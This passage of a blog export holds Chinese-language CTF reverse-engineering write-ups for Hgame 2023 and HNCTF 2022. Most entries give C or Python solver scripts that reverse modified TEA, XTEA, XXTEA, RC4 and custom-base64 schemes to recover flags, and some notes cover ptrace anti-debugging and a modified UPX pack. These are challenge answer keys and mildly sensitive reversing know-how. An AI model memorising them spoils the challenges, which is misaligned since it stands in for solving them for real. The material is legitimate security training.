<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span>=[<span class="number">8</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">str</span>[i*<span class="number">2</span>]+(<span class="built_in">str</span>[i*<span class="number">2</span>+<span class="number">1</span>]&lt;&lt;<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#hgame&#123;encode_is_easy_for_a_reverse_engineer&#125;      </span></span><br></pre></td></tr></table></figure>

<h2 id="a-cup-of-tea"><a href="#a-cup-of-tea" class="headerlink" title="a_cup_of_tea"></a>a_cup_of_tea</h2><p>一个魔改的tea加密</p>
<img src="/2023/01/21/Hgame2023%E5%A4%8D%E7%8E%B0/image-20230121205044461.png" class title="This is an image">

<p>直接给exp了</p>
<h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;</span><br><span class="line">	<span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">-0x543210DD</span> * <span class="number">32</span>, i;</span><br><span class="line">	<span class="type">uint32_t</span> delta = <span class="number">0x543210DD</span>;</span><br><span class="line">	<span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">		v1 -= ((v0 +k2) &lt;&lt;<span class="number">4</span>) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">		v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">		sum += delta;</span><br><span class="line">	&#125;</span><br><span class="line">	v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> key[<span class="number">6</span>] = &#123; <span class="number">0x12345678</span>, <span class="number">0x23456789</span>,<span class="number">0x3456789</span>,<span class="number">0x45678901</span> &#125;;</span><br><span class="line">	<span class="type">uint32_t</span> enc[] = &#123; <span class="number">0x2E63829D</span>,<span class="number">0xC14E400F</span>,<span class="number">0x9B39BFB9</span>,<span class="number">0x5A1F8B14</span>,<span class="number">0x61886DDE</span>,<span class="number">0x6565C6CF</span>,<span class="number">0x9F064F64</span>,<span class="number">0x236A43F6</span>,<span class="number">0x7D6B</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i += <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		decrypt(enc + i, (<span class="type">uint32_t</span>*)key);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>*)(enc));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//hgame&#123;Tea_15_4_v3ry_h3a1thy_drlnk&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//官方exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> </span><br><span class="line">&#123;</span><br><span class="line">	 <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">-0x543210DD</span> * <span class="number">32</span>, i; </span><br><span class="line">	 <span class="type">uint32_t</span> delta = <span class="number">0x543210DD</span>;</span><br><span class="line">	 <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>]; </span><br><span class="line">	 <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) </span><br><span class="line">	 &#123;</span><br><span class="line">     v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">	 v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">	 sum += delta;</span><br><span class="line">	 &#125;</span><br><span class="line">		 v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">		 &#123;</span><br><span class="line">		 <span class="type">int</span> key[<span class="number">4</span>] =</span><br><span class="line">			 &#123; <span class="number">305419896</span>, <span class="number">591751049</span>, <span class="number">878082192</span>, <span class="number">1164413185</span> &#125;;</span><br><span class="line">		 <span class="type">int</span> Buf2[<span class="number">9</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">		 Buf2[<span class="number">0</span>] = <span class="number">778273437</span>;</span><br><span class="line">		 Buf2[<span class="number">1</span>] = <span class="number">-1051836401</span>;</span><br><span class="line">		 Buf2[<span class="number">2</span>] = <span class="number">-1690714183</span>;</span><br><span class="line">		 Buf2[<span class="number">3</span>] = <span class="number">1512016660</span>;</span><br><span class="line">		 Buf2[<span class="number">4</span>] = <span class="number">1636330974</span>;</span><br><span class="line">		 Buf2[<span class="number">5</span>] = <span class="number">1701168847</span>;</span><br><span class="line">		 Buf2[<span class="number">6</span>] = <span class="number">-1626976412</span>;</span><br><span class="line">		 Buf2[<span class="number">7</span>] = <span class="number">594166774</span>;</span><br><span class="line">		 Buf2[<span class="number">8</span>] = <span class="number">0x7D6B</span>;</span><br><span class="line">		 decrypt(Buf2, key);</span><br><span class="line">		 decrypt(Buf2 + <span class="number">2</span>, key);</span><br><span class="line">		 decrypt(Buf2 + <span class="number">4</span>, key);</span><br><span class="line">		 decrypt(Buf2 + <span class="number">6</span>, key);</span><br><span class="line">		 <span class="built_in">puts</span>(Buf2);</span><br><span class="line">		 &#125;</span><br></pre></td></tr></table></figure>

<h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="stream"><a href="#stream" class="headerlink" title="stream"></a>stream</h2><p>RC4+base64</p>
<p>这题我遇到的问题主要出现在一开始反编译一直不成功，只能转成字节码，最后还是用在线反编译成功转成了代码，一直不知道问题在哪，可能是版本问题</p>
<p><strong><a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a></strong></p>
<img src="/2023/01/21/Hgame2023%E5%A4%8D%E7%8E%B0/image-20230122114013068.png" class title="This is an image">

<h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">key</span>):</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        tmp = s[i]</span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = tmp</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">        tmp = s[i]</span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = tmp</span><br><span class="line">        data.append(s[(s[i] + s[j]) % <span class="number">256</span>])</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;As_we_do_as_you_know&#x27;</span></span><br><span class="line">enc = <span class="string">&#x27;wr3ClVcSw7nCmMOcHcKgacOtMkvDjxZ6asKWw4nChMK8IsK7KMOOasOrdgbDlx3DqcKqwr0hw701Ly57w63CtcOl&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c,k <span class="keyword">in</span> <span class="built_in">zip</span>(base64.b64decode(enc).decode(),gen(key)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) ^ k)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#hgame&#123;python_reverse_is_easy_with_internet&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="before-main"><a href="#before-main" class="headerlink" title="before_main"></a>before_main</h2><p>只看出考察的是base64，但没想到就是一个简单的换表</p>
<p><strong>考点：</strong>gcc <strong>attribute</strong> ((constructor)), base64，ptrace反调试</p>
<p>使⽤ <strong>attribute</strong> ((constructor)) 属性修饰函数，使得该函数可以在main函数之前由libc_start_main调⽤</p>
<img src="/2023/01/21/Hgame2023%E5%A4%8D%E7%8E%B0/image-20230122115433564.png" class title="This is an image">

<p>这才是真正修改后的表</p>
<p>并且该函数使⽤ptrace检测是否处于调试状态，所以调试时不会触发换表操作</p>
<p> ptrace提供了一种使父进程得以监视和控制其它进程的方式，它还能够改变子进程中的寄存器和内核映像，因而可以实现断点调试和系统调用的跟踪。</p>
<img src="/2023/01/21/Hgame2023%E5%A4%8D%E7%8E%B0/image-20230122120401820.png" class title="This is an image">

<h5 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;AMHo7dLxUEabf6Z3PdWr6cOy75i4fdfeUzL17kaV7rG=&quot;</span>   <span class="comment">#str1是要解密的代码</span></span><br><span class="line">string1 = <span class="string">&quot;qaCpwYM2tO/RP0XeSZv8kLd6nfA7UHJ1No4gF5zr3VsBQbl9juhEGymc+WTxIiDK&quot;</span>   <span class="comment">#string1是改过之后的base64表</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br><span class="line"><span class="comment">#hgame&#123;s0meth1ng_run_befOre_m@in&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><img src="/2023/01/21/Hgame2023%E5%A4%8D%E7%8E%B0/image-20230122130234011.png" class title="This is an image">

<p>其实就是解一个5*5的矩阵方程</p>
<img src="/2023/01/21/Hgame2023%E5%A4%8D%E7%8E%B0/image-20230122170526228.png" class title="This is an image">

<p>exp还没搞出来，后续补充…</p>
<h2 id="VidarCamera"><a href="#VidarCamera" class="headerlink" title="VidarCamera"></a>VidarCamera</h2><img src="/2023/01/21/Hgame2023%E5%A4%8D%E7%8E%B0/image-20230122171856511.png" class title="This is an image">

<p>一个xtea加密，迭代次数为33轮</p>
<p>key为[2233,4455,6677,8899]</p>
<h5 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">	 <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">	 <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">0x34566543</span>, sum = delta * num_rounds;</span><br><span class="line">		 <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">		 sum -= delta;</span><br><span class="line">		 v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">			</span><br><span class="line">		 v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]) ^ sum;</span><br><span class="line">			</span><br><span class="line">	&#125;</span><br><span class="line">	 v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span> ch[] = &#123; <span class="number">637666042</span>, <span class="number">457511012</span>, <span class="number">-2038734351</span>, <span class="number">578827205</span>, <span class="number">-245529892</span>,<span class="number">-1652281167</span>,<span class="number">435335655</span>,<span class="number">733644188</span>,<span class="number">705177885</span>,<span class="number">-596608744</span> &#125;;</span><br><span class="line">	<span class="type">uint32_t</span> num[] = &#123; <span class="number">2233U</span> ,<span class="number">4455u</span>,<span class="number">6677u</span>,<span class="number">8899u</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">8</span>; i &gt;= <span class="number">0</span>; i -= <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		decipher(<span class="number">33</span>, &amp;ch[i], num);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(ch);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//hgame&#123;d8c1d7d34573434ea8dfe5db40fbb25c0&#125;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>HNCTF2022复现</title>
    <url>/2023/01/07/HNCTF2022%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="TTTTTTTTTea"><a href="#TTTTTTTTTea" class="headerlink" title="TTTTTTTTTea"></a>TTTTTTTTTea</h1><img src="/2023/01/07/HNCTF2022%E5%A4%8D%E7%8E%B0/image-20230107142707236.png" class title="This is an image">

<img src="/2023/01/07/HNCTF2022%E5%A4%8D%E7%8E%B0/image-20230107142805483.png" class title="This is an image">

<p>一个稍微魔改的tea加密</p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;</span><br><span class="line">	<span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0x9e3779b9</span> * <span class="number">32</span>, i;</span><br><span class="line">	<span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">	<span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>]; </span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">		v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + k[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">		sum -= DELTA;</span><br><span class="line">		v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + k[sum &amp; <span class="number">3</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	v[<span class="number">0</span>] = v0;</span><br><span class="line">	v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123; <span class="number">0x00010203</span>,<span class="number">0x04050607</span>,<span class="number">0x08090a0b</span>,<span class="number">0x0c0d0e0f</span> &#125;;</span><br><span class="line">	<span class="type">uint32_t</span> enc[] = &#123; <span class="number">0xC11EE75A</span>,<span class="number">0xA4AD0973</span>,<span class="number">0xF61C9018</span>,<span class="number">0x32E37BCD</span>,<span class="number">0x2DCC1F26</span>,<span class="number">0x344380CC</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		decrypt(&amp;enc[<span class="number">2</span> * i], key);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>*)(enc));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="官方exp"><a href="#官方exp" class="headerlink" title="官方exp"></a>官方exp</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">tea_encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* v, <span class="type">unsigned</span> <span class="type">int</span>* key)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> l = v[<span class="number">0</span>], r = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123; <span class="comment">//进行32次迭代加密，Tea算法作者的建议迭代次数</span></span><br><span class="line">    l += (((r &lt;&lt; <span class="number">4</span>) ^ (r &gt;&gt; <span class="number">5</span>)) + r) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    sum += DELTA; <span class="comment">//累加Delta的值</span></span><br><span class="line">    r += (((l &lt;&lt; <span class="number">4</span>) ^ (l &gt;&gt; <span class="number">5</span>)) + l) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]); <span class="comment">//利用多次双位移和异或将明文与密钥扩散混乱，并将两个明文互相加密</span></span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = l;</span><br><span class="line">  v[<span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">tea_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* v, <span class="type">unsigned</span> <span class="type">int</span>* key)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> l = v[<span class="number">0</span>], r = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line">  sum = DELTA * <span class="number">32</span>; <span class="comment">//32次迭代累加后delta的值</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">    r -= (((l &lt;&lt; <span class="number">4</span>) ^ (l &gt;&gt; <span class="number">5</span>)) + l) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    sum -= DELTA;</span><br><span class="line">    l -= (((r &lt;&lt; <span class="number">4</span>) ^ (r &gt;&gt; <span class="number">5</span>)) + r) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = l;</span><br><span class="line">  v[<span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>]=&#123;<span class="number">0x00010203</span>,<span class="number">0x04050607</span>,<span class="number">0x08090a0b</span>,<span class="number">0x0c0d0e0f</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//char a[24] =&quot;NSSCTF&#123;Tea_TEA_TeA_TEa+&#125;&quot;;</span></span><br><span class="line">        <span class="type">int</span> c[<span class="number">6</span>] = &#123;<span class="number">0xc11ee75a</span>,<span class="number">0xa4ad0973</span>,<span class="number">0xf61c9018</span>,<span class="number">0x32e37bcd</span>,<span class="number">0x2dcc1f26</span>,<span class="number">0x344380cc</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">                tea_decrypt(&amp;c[<span class="number">2</span>*i],key);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">char</span> *p = (<span class="type">char</span>*)c;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">24</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,*p);</span><br><span class="line">                p++;</span><br><span class="line">         &#125; </span><br><span class="line">        <span class="comment">//printf(&quot;you are right!&quot;);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="HNCTF-2022-WEEK3-What’s-1n-DLL"><a href="#HNCTF-2022-WEEK3-What’s-1n-DLL" class="headerlink" title="[HNCTF 2022 WEEK3]What’s 1n DLL?"></a>[HNCTF 2022 WEEK3]What’s 1n DLL?</h1><img src="/2023/01/07/HNCTF2022%E5%A4%8D%E7%8E%B0/image-20230109000008446.png" class title="This is an image">

<p>通过分析应该可以看出关键的加密函数应该在dll文件中</p>
<img src="/2023/01/07/HNCTF2022%E5%A4%8D%E7%8E%B0/image-20230109000200292.png" class title="This is an image">

<img src="/2023/01/07/HNCTF2022%E5%A4%8D%E7%8E%B0/image-20230109000411806.png" class title="This is an image">

<p>但是查壳发现是UPX加壳，并且修改了标志位</p>
<p>修改后：</p>
<img src="/2023/01/07/HNCTF2022%E5%A4%8D%E7%8E%B0/image-20230109000635845.png" class title="This is an image">

<p>看导出表ttt，是一个xxtea</p>
<img src="/2023/01/07/HNCTF2022%E5%A4%8D%E7%8E%B0/image-20230109110906854.png" class title="This is an image">

<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (k[(p&amp;3)^e] ^ z)))  </span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">xxtea</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* v, <span class="type">int</span> n, <span class="type">unsigned</span> <span class="type">int</span>* k)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> z = v[n - <span class="number">1</span>], y = v[<span class="number">0</span>], sum = <span class="number">0</span>, e, DELTA = <span class="number">0x9e3779b9</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> p, q;</span><br><span class="line">	<span class="keyword">if</span> (n &gt; <span class="number">1</span>)  <span class="comment">//coding part</span></span><br><span class="line">	&#123;</span><br><span class="line">		q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			sum += DELTA;</span><br><span class="line">			e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">			<span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line"></span><br><span class="line">			&#123;</span><br><span class="line">				y = v[p + <span class="number">1</span>];</span><br><span class="line">				z = v[p] += MX;</span><br><span class="line">			&#125;</span><br><span class="line">			y = v[<span class="number">0</span>];</span><br><span class="line">			z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125; <span class="keyword">while</span> (--q);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span 